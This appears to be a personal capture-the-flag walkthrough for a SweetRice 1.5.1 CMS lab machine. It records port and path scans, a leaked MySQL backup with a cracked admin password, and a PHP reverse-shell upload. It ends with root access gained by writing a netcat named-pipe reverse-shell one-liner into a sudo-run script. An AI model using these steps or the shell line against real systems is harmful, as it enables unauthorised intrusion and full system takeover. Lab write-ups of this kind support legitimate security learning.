CMS - SweetRice, php, js
version 1.5.1 

http://10.10.0.12/content/inc/mysql_backup/ - mysql db info leak, php/webapps/40718.txt
db creds:
	admin or manager:42f749ade7f9e195bf475f37a44cafcb cracked - Password123 md5


ports:
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
paths:
	

[2K/content              (Status: 301) [Size: 310] [--> http://10.10.0.12/content/]

[2K/content              (Status: 301) [Size: 310] [--> http://10.10.0.12/content/]

[2K/server-status        (Status: 403) [Size: 275]

vulnerable to file uploading on a admin panel on /content/as admin:Password123
upload php rev shell in ads section, open file /content/inc/ads = shell access

cat mysql_login.txt
rice:randompass
didnt use mysql cred, too dumb to access database


sudo -l --- (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
this means sudo wont ask for password only if you run this as a whole, including both paths/whole line, 
but will ask for pass if you try just /usr/bin/perl or other one.

the file backup.pl contains:
	#!/usr/bin/perl

	system("sh", "/etc/copy.sh");

notice the file /etc/copy.sh you can cat out the file and also echo stuff into it with redirection >.

the copy.sh contains:
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
if we deconstruct what this shell file does removes some tmp files; cats out /bin/sh | and pipes into nc on some ip and port 5554.
we can modify this shell file with our ip as target and setup a listner on the 5554 port.
so copy the contents of copy.sh replace ip with your ip, and echo 'new_command' > copy.sh
and then run the command you can run as sudo, sudo /usr/bin/perl /home/itguy/backup.pl and you got a root shell.

user.txt is in /home/itguy
root.txt is in /root

paths:
	
[2K/content              (Status: 301) [Size: 310] [--> http://10.10.0.12/content/]

[2K/content              (Status: 301) [Size: 310] [--> http://10.10.0.12/content/]

[2K/server-status        (Status: 403) [Size: 275]
ports:
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
